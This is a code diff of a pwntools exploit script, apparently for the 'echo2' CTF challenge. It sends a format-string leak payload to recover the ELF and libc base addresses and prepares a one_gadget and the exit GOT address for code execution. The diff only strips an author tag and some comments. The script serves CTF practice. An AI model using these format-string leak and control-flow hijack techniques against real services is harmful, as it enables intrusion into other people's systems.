@@ -1,12 +1,10 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-__Auther__ = 'M4x'
 
 from pwn import *
 import sys
 from time import sleep
 context.log_level = "debug"
-context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 
 if sys.argv[1] == 'l':
     io = process("./echo2", env = {"LD_PRELOAD": "./libc-2.23.so.x86_64"})
@@ -21,12 +19,12 @@ else:
     libc = ELF("./libc-2.23.so.x86_64")
     elf = ELF("./echo2")
     one_gadget = 0x45206
-    libc_offset = 0x0000000000020740 #objdump -D ./libc-2.23.so.x86_64 | grep __libc_start_main -m 1
+    libc_offset = 0x0000000000020740
     exit_got = elf.got["exit"]
 
 def getAddr():
     io.sendline("%41$p..%43$p..")
-    elf_base = int(io.recvuntil("..", drop = True), 16) - 74 - 0x9b9#nm ./echo2
+    elf_base = int(io.recvuntil("..", drop = True), 16) - 74 - 0x9b9
     libc_base = int(io.recvuntil("..", drop = True), 16) - 240 - libc_offset # this is for remote
     #  libc_base = int(io.recvuntil("..", drop = True), 16) - 241 - libc_offset #this is for local
     log.info("elf_base -> 0x%x" % elf_base)
